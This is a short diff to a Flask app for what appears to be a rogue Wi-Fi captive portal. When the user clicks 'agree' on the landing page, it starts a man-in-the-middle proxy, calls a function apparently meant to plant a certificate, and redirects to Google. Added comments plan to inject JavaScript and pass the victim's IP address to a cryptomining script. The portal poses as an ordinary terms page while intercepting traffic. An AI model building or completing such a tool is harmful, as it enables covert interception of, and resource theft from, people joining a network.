@@ -13,10 +13,10 @@ def welcome():
         return render_template('wifi_m/landing_page/index.html')
     else:
         if request.form['submit'] == 'agree':
-            load_mitm.run()
+            load_mitm.ProxyMaster.run()
             models.get_cert()
-            if True:
-            #TODO serve script from models
+            if True: #if certificate loads correctly
+            #TODO inject js script
             #TODO locate current IP address, append to txt file, and pass onto mining py file
                 return redirect ('http://www.google.com', code = 302)
         else:
